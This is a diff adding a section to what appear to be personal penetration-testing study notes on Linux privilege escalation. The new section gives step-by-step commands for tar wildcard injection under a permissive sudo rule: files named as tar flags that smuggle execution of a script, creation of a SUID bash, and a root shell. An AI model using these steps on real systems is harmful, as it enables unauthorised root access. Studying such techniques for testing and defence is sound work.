@@ -299,6 +299,28 @@ See [[18. Linux Privilege Escalation|LPE.19]], [[18. Linux Privilege Escalation#
 
 ---
 
+## sudo -l shows tar with bare `*` wildcard
+
+```
+(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
+```
+
+The unquoted `*` expands filenames from CWD. Files named `--checkpoint=1` and `--checkpoint-action=exec=bash script.sh` are treated as tar flags.
+
+| Step | Action |
+|---|---|
+| 1 | `echo "" > '--checkpoint=1'` |
+| 2 | `echo "" > '--checkpoint-action=exec=bash privesc.sh'` |
+| 3 | Create `privesc.sh` with SUID bash payload, `chmod +x` it |
+| 4 | Run the exact sudo tar command from that directory |
+| 5 | `/tmp/rootbash -p` → root |
+
+**Gotcha:** `exec=privesc.sh` alone fails — use `exec=bash privesc.sh`. Cannot use absolute paths (slashes aren't valid in filenames).
+
+→ [[PrivEsc Linux - Tar Wildcard]] | [[Linux Privilege Escalation]] (Command Appendix)
+
+---
+
 ## Kernel CVE quick reference (updated)
 
 | Version / Binary | CVE | Technique |
